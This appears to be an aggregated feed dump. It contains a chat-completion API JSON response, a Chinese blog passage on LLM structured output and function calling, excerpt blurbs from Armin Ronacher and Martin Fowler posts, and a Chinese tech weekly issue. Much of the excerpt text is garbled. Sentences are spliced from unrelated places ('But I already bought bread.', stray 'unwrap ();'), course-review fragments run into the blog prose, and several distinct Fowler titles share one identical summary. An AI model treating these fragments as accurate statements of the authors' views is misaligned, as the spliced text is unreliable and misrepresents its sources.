{ "id": "chatcmpl-BiIC25mIqyGqDK1ePyzRZk71eES1B", "object": "chat.completion", "created": 1749896066, "model": "gpt-4o-mini-2024-07-18", "choices": [ { "index": 0, "message": { "role": "assistant", "content": "This is a test.", "refusal": null, "annotations": [] }, "logprobs": null, "finish_reason": "stop" } ], "usage": { "prompt_tokens": 31, "completion_tokens": 5, "total_tokens": 36, "prompt_tokens_details": { "cached_tokens": 0, "audio_tokens": 0 }, "completion_tokens_details": { "reasoning_tokens": 0, "audio_tokens": 0, "accepted_prediction_tokens": 0, "rejected_prediction_tokens": 0 } }, "service_tier": "default", "system_fingerprint": "fp_34a54ae93c" }

如果你想要實作出類似 ChatGPT 那樣的對話應用, 每次 user 送出訊息就重複呼叫一次, 直到對話結束為止。這篇文章所有的案例, 都是從這個基本型態的 API 出發, 如果你看懂了, 就繼續往下看吧!

以下段落的格式說明:

接下來，就是蒐集先前 FB 貼文的部分了。當時我每天在 FB 說明一個主題介紹，而實作說明則都在影片中，兩者我都附在下方。介紹的部分我建議都看一看，有興趣再看對應的影片就好。如果你碰到特別有興趣的主題，則 FB 的連結我也建議點進去看一下，也許會看到有幫助的留言或是討論。這些都是大家的見解, 對我而言這些 feedback 其實幫助很大, 建議你別錯過這些片段的資訊。

以上說明到此，歡迎繼續往下看~

Day 1, Structured Output

Link: FB POST

這是我在 .NET Conf 2024 的其中一張簡報, 今天想聊一下這題..

Developer 應該怎樣善用 AI?

別誤會了，我沒有要聊 GitHub Copilot / Cursor 寫 code 有多厲害, 那個大家講到爛了, 我來講並沒有比較厲害, 反正用 AI 輔助 coding 早就不可逆了, 用就對了。我要談的是, 如果把 LLM 當作你的可用套件或是服務之一, 你會怎樣應用在你的 Application? 當 LLM 在各位開發人員手上, 各位你知道你手上的武器有多大的威力嗎? 這頁簡報，談的是先進的 LLM ( 我拿 GPT4o-mini 當分界 )，開始正式支援 Json Schema. But I already bought bread.

其他進階的範例 ( http request / response, 以及對應的 C# code, 我等隔天的 PO 文一起說明 )

Day 3, Function Calling (Case Study)

Link: FB POST

昨天談完 Function Calling 的基本型態, 今天來看看實際上可以做出什麼類型的應用吧~ 簡單的說，推理能力夠好的 LLM, 已經有辦法從:

可用的指令規格 (你手上有的工具) 你的意圖

直接產生符合 (1) 跟 (2) 的對等 “指令執行順序” …, 如昨天所說, 這是將文字敘述的意圖, 翻譯成指令集執行順序的編譯器了。這在過去不靠 AI 是完全做不到的事情，我才會說所有 AI 神奇的應用，大半都是從 Function Calling 的能力累積而來的。

不過，昨天只談了一半，解譯出 “指令執行順序(含參數)”，只有 “Calling” 啊，Function 應該是有 Return 結果的，而且有時應該要有順序相依關係的 (你要執行完 Func1, 拿到結果後才決定怎麼執行 Func2 ..)

於是，來看看這頁簡報 (同樣是來自 .NET Conf 2024 我那場的簡報) 吧:

這情境是:

User: find a 30 min slot for a run tomorrow morning (幫我找明早 30min 空檔, 我要慢跑)

先省略中間過程，我期待 AI 能幫我處理好所有事情 ( 按照要求 Booking 行事曆 )，並且回覆我這段訊息:

AI: Morning run scheduled for tomorrow at 9am ! (已經幫您預約好明早 9:00 慢跑)

這神奇的結果，是怎麼靠 Function Calling 辦到的? 我就列出檯面上 & 檯面下的對談過程，你大概就能理解這整件事的來龍去脈了。

system: tools: [ “check_schedules”, “add_event” ] user: find a 30 min slot for a run tomorrow morning

送出這段歷程後, 第一次 AI 會回應: tool: [ check_schedule( 03/21 06:00, 03/21 12:00 )]

收到這段回應後, 代表 AI 需要叫用 check_schedule 這工具, 並且給他時間範圍, 明天 (03/21) 的 06:00 ~ 12:00…

當你的應用程式, 代替 AI 執行完這段指令, 並且回覆結果 ( append 對話紀錄 ) tool-result: [ “07:00-08:00, 起床換裝”, “08:00-09:00, 吃早餐”, “10:00~12:00, 跟同事視訊會議” ]

送出後, AI 得到結果，判定思考後，會再次送出這回應: tool: [ add_event( 03/21 09:00 - 09:30 )]

同上面的過程，AI 表達他需要使用 add_event 這工具。你的應用程式應該替他執行並且給 AI 執行結果: tool-result: [ “success” ]

再次送出結果給 AI，最後 AI 判定任務完成，就彙整上面的過程，最後直接回應這訊息: assistant: morning run scheduled for tomorrow at 9am!

以上就是完整的對話過程。這邊留意，我標示的 (1) ~ (7), 是 chat history 的序號跟內容。每次呼叫 AI Chat Completion，都是把 history 當下為止的所有內容 (從 0 開始) 都送出去。

system 代表 system prompt, 最高優先權, 背景設定用

user 則代表使用者直接輸入的訊息

assistant 則代表 AI 要回應給使用者的訊息

其中 tool 代表 AI 回應給 APP 的訊息, 需要 APP 檯面下替他執行這指令，而 tool-result 則是 APP 執行後在檯面下回覆 AI 執行結果的兩種特殊 message. 會。RAG進階課程 會，Kernel Memory 與 Semantic Kernel 的整合應用，運用LLM介入程式邏輯處理實際問題 使用Net整合LLM開發應用程式 會，會說明介紹的仔細可以學習到許多事情 會，適合已經知道AI、ChatGPT但對於semantic kernel不了解的人 會，但是要確認對方是開發者。有點難介紹，感覺把FB的文章附上就可以讓其他人知道內容的豐富度!! 自炊 NotebookLLM/AI Agent 會、LLM應用實戰大招 是，很有深度且收穫良多 會，是一門讓人了解實務上 LLM 整合方式、進階 RAG 應用等技術的好課 AI 時代，必上的一門課程。 RAG 神器 會 可以增加對AI的領會 是個初步認識SK的好課程 大概了解目前可以如何串接sdk&llm 如何強化 LLM 的應用 會。讓你更了解 function call 與 MCP 的底層觀念 會。深入淺出Agentic 從基礎開始打造RAG系統 對基礎很有幫助 會 推薦AI 相關工作者都應學習 目前尚不會，尚待多加學習了解！ 是，了解AI底層邏輯的好課程

統計: 整體評分
Source: 安德魯的部落格

**Seeking Purity**
The concept of purity — historically a guiding principle in social and moral contexts — is also found in passionate, technical discussions. For instance, the role of Rust in the Linux kernel has been a hot topic. To make the detractors go away.
Source: Armin Ronacher's Thoughts and Writings

**Ugly Code and Dumb Things**
Ugly Code and Dumb Things

This week I had a conversation with one of our engineers about “shitty code” which lead me to sharing with him one of my more unusual inspirations: Flamework, a pseudo framework created at Flickr.

Two Passions, Two Approaches There are two driving passions in my work. It was more of an idea and principles of engineering at Flickr. If these ugly choices help you move faster, attract users and validate the product, then a rewrite, or large refactorings later are a small price to pay.
Source: Armin Ronacher's Thoughts and Writings

**Bridging the Efficiency Gap Between FromStr and String**
Bridging the Efficiency Gap Between FromStr and String

Sometimes in Rust, you need to convert a string into a value of a specific type (for example, converting a string to an integer).

For this, the standard library provides the rather useful FromStr trait. The benefit of using this directly is that a lot of types can be converted into that error, even if they are not errors themselves. unwrap ();

Hopefully, this utility is useful in your own codebase when wanting to abstract over string conversions.

If you need it exactly as implemented, I also published it as a simple crate.

Postscriptum:

A big thank-you goes to David Tolnay and a few others who pointed out that this can be done with transmute_copy .
Source: Armin Ronacher's Thoughts and Writings

**Rust Any Part 3: Finally we have Upcasts**
Rust Any Part 3: Finally we have Upcasts

Three years ago I shared the As-Any Hack on this blog. downcast_ref :: < i32 > ()); // Compile error }

The same would happen if we tried to cast it into an &dyn Any ? A compile error again:

fn main () { let any_box = AnyBox ( Box :: new ( 42 i32 )); let any = &* any_box . At least once your MSRV moves up.

Thank you so much to everyone who worked on this to make it work!

For completeness' sake here is the extension map from the original block post cleaned up so that it does not need the as-any hack:
Source: Armin Ronacher's Thoughts and Writings

**I'm Leaving Sentry**
I'm Leaving Sentry

Every ending marks a new beginning, and today, is the beginning of a new chapter for me. There are so many bright individuals at Sentry, and I'm incredibly proud of what we have built together. For making Sentry what it is today.
Source: Armin Ronacher's Thoughts and Writings

**AI Changes Everything**
AI Changes Everything

At the moment I'm working on a new project. And yet, oddly, there are so many technologists who are holdouts. And while it's early, I think we'll look back at this decade the way past generations looked at electricity or the printing press — not as a curiosity, but as the moment when everything changed.

I encourage you not meet that moment with cynicism or fear: meet it with curiosity, responsibility and the conviction that this future will be bright and worth embracing.
Source: Armin Ronacher's Thoughts and Writings

**GenAI Criticism and Moral Quandaries**
GenAI Criticism and Moral Quandaries

I've received quite a bit of feedback on the last thing I wrote about AI, particularly around the idea that I'm too quick to brush aside criticism. My stance on this is rather simple: margins will erode, there will be a lot of competition and we all will pay for the inference necessary and someone will make money. Taking a positive view gives you a form of an excited acceptance of the future.
Source: Armin Ronacher's Thoughts and Writings

**Agentic Coding Recommendations**
Agentic Coding Recommendations

There is currently an explosion of people sharing their experiences with agentic coding. I don't mean that it writes slow code, i mean that the agent loop is really slow. You don't want to do it too early and you definitely do not want to do it too late.
Source: Armin Ronacher's Thoughts and Writings

**We Can Just Measure Things**
We Can Just Measure Things

This week I spent time with friends to letting agents go wild and see what we could build in 24 hours. I have been harping on this for years when working at Sentry, but with agents it becomes even clearer that this investment pays off. I can confidently say it's not just me that does not like Xcode, my agent also expresses frustration — measurably so.
Source: Armin Ronacher's Thoughts and Writings

**My First Open Source AI Generated Library**
My First Open Source AI Generated Library

I'm currently evaluating how different models perform when generating XML versus JSON. If tags are incorrectly closed within a larger tag we recover the structure. It is however certainly something we'll all have to confront sooner or later.
Source: Armin Ronacher's Thoughts and Writings

**GenAI Patterns: Retrieval Augmented Generation (RAG)**
I've been educating professional software developers for three decades, and during that time I've seen many “game-changing developments”, most of which fizzle. However, we've also found the need to make many enhancements to the basic idea to make this work with serious problem. This was more than could be done by enhancing prompts with a few document fragments, it needed a deeper re-aligning of the way that the model did its work.
Source: Martin Fowler

**GenAI Patterns: RAG Limitations and Hybrid Retriever**
I've been educating professional software developers for three decades, and during that time I've seen many “game-changing developments”, most of which fizzle. However, we've also found the need to make many enhancements to the basic idea to make this work with serious problem. This was more than could be done by enhancing prompts with a few document fragments, it needed a deeper re-aligning of the way that the model did its work.
Source: Martin Fowler

**The DeepSeek Series: A Technical Overview**
Shayan Mohanty is the Head of AI Research at Thoughtworks, where his group focuses on foundational research to bridge the gap between AI development and production. Early layers use higher-dimensional queries for expressiveness; deeper layers more aggressively compress to save activation memory.

: Where V2 used a fixed $d_c$ dimension, V3 employs an adaptive scaling of the query up/down at different layer depths. The final result is a model that: Retains strong chain-of-thought for verifiable tasks,

Aligns to broad user requests in everyday usage,

Maintains safer, more controlled outputs.
Source: Martin Fowler

**GenAI Patterns: Query Rewriting**
I've been educating professional software developers for three decades, and during that time I've seen many “game-changing developments”, most of which fizzle. However, we've also found the need to make many enhancements to the basic idea to make this work with serious problem. This was more than could be done by enhancing prompts with a few document fragments, it needed a deeper re-aligning of the way that the model did its work.
Source: Martin Fowler

**GenAI Patterns: Reranker**
I've been educating professional software developers for three decades, and during that time I've seen many “game-changing developments”, most of which fizzle. However, we've also found the need to make many enhancements to the basic idea to make this work with serious problem. This was more than could be done by enhancing prompts with a few document fragments, it needed a deeper re-aligning of the way that the model did its work.
Source: Martin Fowler

**What role does LLM reasoning play for software tasks?**
Generative AI and particularly LLMs (Large Language Models) have exploded into the public consciousness. I have now taken on a role in Thoughtworks to coordinate our work on how this technology will affect software delivery practices. I'm posting various memos here to describe what my colleagues and I are learning and thinking.

If you're wondering why we use a donkey in our series image, read why I made up a persona for an eager, yet unreliable, coding assistant.
Source: Martin Fowler

**GenAI Patterns: Guardrails and RAG overview**
I've been educating professional software developers for three decades, and during that time I've seen many “game-changing developments”, most of which fizzle. However, we've also found the need to make many enhancements to the basic idea to make this work with serious problem. This was more than could be done by enhancing prompts with a few document fragments, it needed a deeper re-aligning of the way that the model did its work.
Source: Martin Fowler

**GenAI Patterns: Fine Tuning**
I've been educating professional software developers for three decades, and during that time I've seen many “game-changing developments”, most of which fizzle. However, we've also found the need to make many enhancements to the basic idea to make this work with serious problem. This was more than could be done by enhancing prompts with a few document fragments, it needed a deeper re-aligning of the way that the model did its work.
Source: Martin Fowler

**Commenting on removing "X" on US passports**
Martin Fowler: 26 Feb 2025

The new US administration has decided to eliminate the “X” option for gender/sex on passports. There’s not much I can do to object to this change, but one little thing is to add a comment on the Federal Register for such rule changes. Pretty inconsequential compared to the problems facing my non-binary friends.
Source: Martin Fowler

**The role of developer skills in agentic coding**
Generative AI and particularly LLMs (Large Language Models) have exploded into the public consciousness. I have now taken on a role in Thoughtworks to coordinate our work on how this technology will affect software delivery practices. I'm posting various memos here to describe what my colleagues and I are learning and thinking.

If you're wondering why we use a donkey in our series image, read why I made up a persona for an eager, yet unreliable, coding assistant.
Source: Martin Fowler

**I've been kidnapped by Robert Caro**
I've always enjoyed reading, and for most of my life I've particularly enjoyed reading history. I'm a professional writer of non-fiction, but reading this book reminds me how far I have yet to advance to consider myself anywhere close to mastery of my profession. I can't wait to get started.
Source: Martin Fowler

**Social Media Engagement in Early 2025**
A few years ago, whenever I published a new article here, I would just announce it on Twitter, which seemed to help attract readers who would find the article worthwhile. I add some horizontal jitter to these points so they don't print on top of each other. 80% of the traffic to my site goes to articles that are over six months old.
Source: Martin Fowler

**Updating yesterday's post on social media engagement**
A few years ago, whenever I published a new article here, I would just announce it on Twitter, which seemed to help attract readers who would find the article worthwhile. I add some horizontal jitter to these points so they don't print on top of each other. 80% of the traffic to my site goes to articles that are over six months old.
Source: Martin Fowler

**Guiding an LLM for Robust Java ByteBuffer Code**
This article is part of “Exploring Gen AI” . The developer now pushes for better software design, moving from static utility methods to an object-oriented approach.

Developer Requests Refactoring to Instance-Based Class Developer: “Excellent, that's exactly the pattern needed. Critical Evaluation: Throughout the process, the developer critically evaluated the LLM's output against not just functional requirements but also non-functional requirements like safety, stability, and maintainability.
Source: Martin Fowler

**科技爱好者周刊（第 354 期）：8000mAh 手机电池，说明了什么？**
这里记录每周值得分享的科技内容，周五发布。

本杂志开源，欢迎投稿。另有《谁在招人》服务，发布程序员招聘信息。合作请邮件联系（[email protected]）。

封面图

成都推出机器人交警。（via）

8000mAh 手机电池，说明了什么？

大家发现了吗，手机的电池正在越变越大。

你可以看一下你的手机，电池容量是多少。

仅仅三四年前，手机电池一般都是 4000mAh（毫安时），最多就到 5000mAh。

但是在去年（2024年），电池容量增加到了 6000mAh。今年（2025年）更是出现好几部 8000mAh 的手机。

更让人惊奇的是，这些手机并没有因为更大的电池，而变得更重更厚。

以某品牌的 8000mAh 手机为例，重量209克，厚度7.98毫米，跟一般的大屏手机差不多。

为什么手机塞进了更多的电池，却没有变重？

原因很简单，电池技术在这几年出现了突破。

大家应该听说过"固态电池"。它不同于现在的锂电池，最大特点是更高的能量密度，也就是同样的重量可以储存更多的能量。

但是，固态电池还在测试中，量产时间最快也要等到2027年。目前，真正进入市场的是"半固态电池"。

半固态电池介入传统锂电池与固态电池之间，电解液是固态和液态的混合物。

2023年4月份，宁德时代宣布将要生产凝聚态电池，也就是半固态电池。

根据厂家公布的数据，这种电池的能量密度是 500 Wh/kg，也就是每公斤可以储存0.5度电，传统锂电池的能量密度是 250 Wh/kg。

所以，手机从锂电池换成半固态电池，重量不变，电量翻一倍，正好从 4000mAh 增加到 8000mAh。从时间上看，半固态电池是2023年发布，2024年投产，2025年进入消费电子产品，时间也刚好。

可以预期，随着越来越多手机换成半固态电池和将来的固态电池，续航时间不再成为问题，充电焦虑将彻底消失。

以今年发布的 8000mAh 手机为例，续航时间就非常惊人。根据评测，它可以连续播放25小时的视频。也就是说，中度或轻度使用时，可以两天一充，甚至三天一充。

半固态电池只有中国厂商量产了，目前只用于中国品牌的手机。三星旗舰手机 S25 Ultra 的电池容量，还停留在几年前的 5000mAh，苹果就更差劲了，iPhone 16 Pro 是 3582mAh，iPhone 16 Pro Max 是 4685mAh。所以，中国品牌手机在电池上是世界领先。

固态电池的应用，不限于手机。有报道说，比亚迪正在测试固态电池的汽车，续航里程居然可以达到1875公里。

这意味着，一次充满电，可以从上海开到成都（直线距离1600公里），太不可思议了。

固态电池还使得电动飞机成为可能。飞机需要大量能源，同时又不能有太大的起飞重量，固态电池正好满足。中国的电动飞行器，很可能会像电动汽车一样，成为下一个在全球竞争中脱颖而出的产业。

科技动态

1、世界最长的航线

本周，中国东航宣布将开通中国到阿根廷的航线，这将是两国之间的唯一直航航线，也是世界最长航线。

在地球仪上，从中国传过地心就是阿根廷，两国之间的距离，相当于赤道的一半。因此，地球任意两个城市之间，几乎不可能有更长航线了。

赤道的长度是4万公里，这条航线是19,680公里。没有任何民航客机，可以一次性飞2万公里，所以这条航线中途会在新西兰落地休息。

整个飞行时间大约24小时～25小时，十分辛苦，上海到新西兰要11个小时，新西兰到阿根廷又要十几个小时。

2、一家以色列的 AI 编程公司，上周以8000万美元被收购。

这家公司刚刚成立半年，31岁的创始人一开始是兼职的，现在全公司也只有8个人。

它年初才成立，五月份首次实现盈利18.9万美元，六月份就以8000万美元被收购。

这到底反映了我们正处在 AI 的泡沫，还是验证了 Sam Altman 的预言："AI 会创造一个人的独角兽（估值10亿美元的创业公司）"。

3、本周，比尔·盖茨与托瓦兹见面了。

上面照片中，左一是微软 Azure 云服务的首席技术官 Mark Russinovich，他组织了这次饭局。

左二是 Windows 创始人比尔·盖茨，右二是 Linux 创始人托瓦兹（Linus Torvalds），右一是 Windows NT 的首席架构师 Dave Cutler。

比尔·盖茨与托瓦兹从未见过，这是两人第一次见面。多年前，Windows 和 Linux 互相将对方视为敌人，现在创始人都老了，终于一笑泯恩仇。

4、问答网站 Stack Overflow，快要被 AI 消灭了。

五月份，整个网站上的新发布问题只有20000个，跟刚上线的2008年下半年相仿。

6月份更惨，截止到6月25日，新发布问题只有12015个。

最高峰的2020年，每月的新问题超过30万个。它的访问量曾经排名全球前50名，就这样被 AI 淘汰了。

5、一项研究确认，AI 影响了网站的访问量。

研究发现，谷歌搜索的 AI 总结，让其他网站的访问量下降了30%。

可以想像，随着 AI 大量使用，网站的访问人数还会大大下降。

文章

1、智能插头当作网站开关（英文）

作者想了一个很聪明的方法，将智能插头当作网站的浏览开关。

如果本机通过 Wifi 检测到插头，就立刻修改 /etc/hosts 文件，使得某些社交网站无法访问。反之，拔出插头，则计算机将该文件再改回原样。

2、网页压缩算法比较（英文）

服务器发送给浏览器的网页，一般都是压缩的，主要有四种算法：gzip、deflate、brotli、zstd。

作者用 Go 语言测试，哪种压缩算法对服务器开销比较小。

3、巧解 Docker 镜像拉取失败（中文）

本文介绍一种拉取 Docker 镜像的变通方法：通过 GitHub workflow 拉取，然后存储到阿里云个人镜像站，并给出脚本。（@you8023 投稿）

4、CSS 的部分关键帧（英文）

本文是 CSS 中级教程，介绍 CSS 动画如果只写一个关键帧（起始/结束），也有很多应用场景。

5、让 Claude Code 使用其他模型（中文）

Claude Code 只能使用自家模型，本文介绍使用 Claude Bridge，让它可以使用任意第三方模型，从而极大降低使用成本。（@jerrylususu 投稿）

6、git notes 命令（英文）

git 有一个鲜为人知的 notes 命令，可以往日志添加自定义数据，很适合为每次提交加入元数据。

7、如何减少 OpenAI 的音频/视频费用（英文）

作者让 OpenAI 概括一个视频的内容，意外发现，如果让文件的播放速度加快到2倍或3倍，OpenAI 的处理费用可以减少30%以上。

原因可能是，加速会让一些短音节变得不明显，从而减少输入 token 的数量。

工具

1、postmarketOS

一个专门适配移动设备的 Linux 发行版，适合将过时的手机变成 Linux 设备。

2、to-userscript

一个命令行工具，可以将浏览器插件转成 userscript，方便移植。

3、Reeden

纯本地的电子书阅读软件，支持多个平台，免费版没有数据同步和 AI 功能。（@unclezs 投稿）

4、AdaCpp

一个基于浏览器的在线 C++ 学习环境，可以编辑/编译代码，并有 AI 的代码解释。（@xueywn 投稿）

5、Moocup

一个为图片加上背景渐变色的在线工具。

6、浸入式学语言助手

开源的浏览器翻译插件，根据设定的外语水平，帮助在日常网页浏览中自然地学习外语。（@xiao-zaiyi 投稿）

7、EasyDisplay

通过局域网展示数位看板的解决方案。（@yyfd2013zy 投稿）

8、QueryBox

跨平台的桌面端 GraphSQL 调试工具。（@zhnd 投稿）

9、RingLink

国产的远程设备互通组网的工具，类似于 Tailscale。（@Aplusink 投稿）

10、LogTape

JS 日志库，号称性能好，功能强，参见介绍文章。

11、Project Indigo

Adobe 推出的一款免费的 iPhone 相机，比原生相机更简单易用，融入了 AI 的自动调整，参见介绍文章。

AI 相关

1、Gemini CLI

谷歌推出的基于终端的 AI 客户端，可以完成各种 AI 操作，包括调用谷歌的视频模型 Veo 和图像模型 Imagen。

此前，其他 AI 公司已经发布了类似的命令行产品，比如 Claude Code 和 OpenAI Codex (CLI)。

2、Twocast

真人 AI 播客生成器，一键生成 3~5 分钟播客，支持多语言、多音色，免费开源。（@panyanyany 投稿）

3、Duck.ai

DuckDuckGo 推出的免费 AI 聊天服务，强调保护用户隐私。

资源

1、My Ringtone

免费无需注册的铃声搜索下载网站，提供 MP3 格式铃声。（@twjiem 投稿）

2、维基电台 Wiki Radio

这个网站随机播放，维基百科里面的音频文件。

3、ICONIC

一个开源的图标库，专门提供各种软件技术的图标。

4、Linux/Windows 开发 iOS 应用教程（英文）

一个图文教程，使用 xtool 工具在 Linux/Windows 上开发 iOS 应用。

图片

1、印度裔掌管的美国科技公司

印度人在美国科技界有着庞大的势力，下图是印度裔掌管的美国科技公司的不完全列表。

微软、谷歌、IBM 都是印度裔掌管的。

2、迪士尼绿

迪士尼乐园使用绿色，对很多基础设施进行油漆。

这样做的目的是，尽量减少游客对基础设施的关注。

这种绿色就被称为"迪士尼绿"。

文摘

1、离职面谈是不必要的

当你即将离职，HR 可能想找你进行一次"离职面谈"，询问你"为什么要离职？"，以及"跟同事一起工作感觉如何"。

别上当。你的最佳选择是，推掉这些离职面谈，如果不行，那也不要对任何人或任何事进行批评。

你可以回答，你遇到了一个不想放过的机会，然后很荣幸能跟曾经的同事一起工作，对于这家公司曾经给予的工作机会，充满感激。就这样，离职面谈就可以结束了。

这有几个原因。

（1）离职面谈不会给你带来任何好处，反而会带来很多负面后果。

你的建议和反馈，不会得到采纳和改进。反而，你会被别人认为是一个爱抱怨的人，并可能因此树敌。

没人想树敌。你或许以为自己再也不用和那些领导和同事打交道了，但这个世界真的很小。

（2）一旦你递交了辞呈，在你离开公司之前，你的目标就是让人们永远记得你，对你留下好印象。

你要优雅地离开，不要破坏任何人际关系。无论你心里认为，老板有多愚蠢，部门有多糟糕，都不要说出来。说出来不会有好结果，只会伤害你自己。

（3）同理，不要给同事们发一封冗长的告别电子邮件，告诉他们你为什么离开，这毫无意义且有害。

人们对这种事的记忆力很强。发一封邮件抱怨公司有多糟糕，你就会以这种方式被人们记住，很有可能还会传开，而你所做的一切好事都会被人们忘记。

（4）如果你真的对公司运作有什么建议，最好没辞职的时候就说出来。如果那样没有效果，那么你在离职面谈中给出忠告，更不会有效果了。

（5）离职后，原来的公司变好或变坏，都跟你无关了。你也不应该再关心那些问题了。

总之，最好的离职就是不惹恼别人，悄悄地离开，全力以赴你接下来的路。

言论

1、

AI 使得我的90%技能，价值变为0，但使得剩下的10%技能，价值增长了1000倍。

每个人在 AI 面前，都需要重新调整自己的技能。

-- Kent Beck，极限编程的创始人

2、

Anthropic 公司为了训练模型，聘请了谷歌图书扫描项目前主管汤姆·特维（Tom Turvey）。

他的任务是获取"世界上所有的书籍"，花费数百万美元购买了数百万本纸质书籍，新的和二手的都有。然后，把这些书都拆了，进行扫描，完成后就扔掉。

-- 美国法院判决书，出版公司控告 Anthropic 未经许可使用版权书籍训练模型，法院一审判 Anthropic 胜诉

3、

西方国家的博士学位，基本上是移民计划，而大学很乐意配合。

-- Hacker News 读者

4、

企业将来不会区分"Python 程序员"或"React 程序员"，招聘的时候，不会在意你会什么语言。企业只会招聘能够解决问题的程序员，不管他们的技术栈。因为有了大模型，编程语言障碍已经完全消失了。

我们已经到了这个地步：学习哪种编程语言无关紧要。现在真正的技能是系统设计、架构、DevOps、云计算----那些在 AI 之上快速构建系统的技能。

-- Reddit 读者

5、

社会的危机，不是人变得孤独，而是人变得隐形、没有用处、可有可无。

-- 《隐形的人》

往年回顾

不要看重 Product Hunt（#307）

黄仁勋的 Nvidia 故事（#257）

汽车行业的顶峰可能过去了（#207）

KK 给年轻人的建议（#157）

（完）
Source: 阮一峰的网络日志

